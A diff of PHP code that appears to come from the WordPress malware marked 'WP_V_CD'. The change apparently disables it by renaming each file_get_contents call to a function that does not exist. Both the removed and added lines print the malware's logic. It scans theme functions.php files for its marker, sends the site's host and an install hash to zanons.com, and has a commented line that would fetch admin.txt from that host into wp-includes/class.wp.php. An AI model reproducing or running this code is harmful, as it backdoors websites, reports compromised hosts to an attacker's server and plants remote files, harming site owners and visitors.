@@ -21,7 +21,7 @@ ini_set('display_errors', 0);
 								{
 									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php');
 										
-									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
+									if ($content = file__get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
 										{
 											if (strpos($content, 'WP_V_CD') === false)
 												{
@@ -49,7 +49,7 @@ ini_set('display_errors', 0);
 								                      {
 									$time = filectime($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php');
 										
-									if ($content = file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
+									if ($content = file__get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . $_2 . DIRECTORY_SEPARATOR . 'functions.php'))
 										{
 											if (strpos($content, 'WP_V_CD') === false)
 												{
@@ -80,13 +80,13 @@ ini_set('display_errors', 0);
 						}
 						
 					if ($ping) {
-						$content = @file_get_contents('http://www.zanons.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
-						//@file_put_contents(ABSPATH . '/wp-includes/class.wp.php', file_get_contents('http://www.zanons.com/admin.txt'));
+						$content = @file__get_contents('http://www.zanons.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
+						//@file_put_contents(ABSPATH . '/wp-includes/class.wp.php', file__get_contents('http://www.zanons.com/admin.txt'));
 					}
 					
 															if ($ping2) {
-						$content = @file_get_contents('http://www.zanons.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
-						//@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file_get_contents('http://www.zanons.com/admin.txt'));
+						$content = @file__get_contents('http://www.zanons.com/o.php?host=' . $_SERVER["HTTP_HOST"] . '&password=' . $install_hash);
+						//@file_put_contents(ABSPATH . 'wp-includes/class.wp.php', file__get_contents('http://www.zanons.com/admin.txt'));
 //echo ABSPATH . 'wp-includes/class.wp.php';
 					}
 					
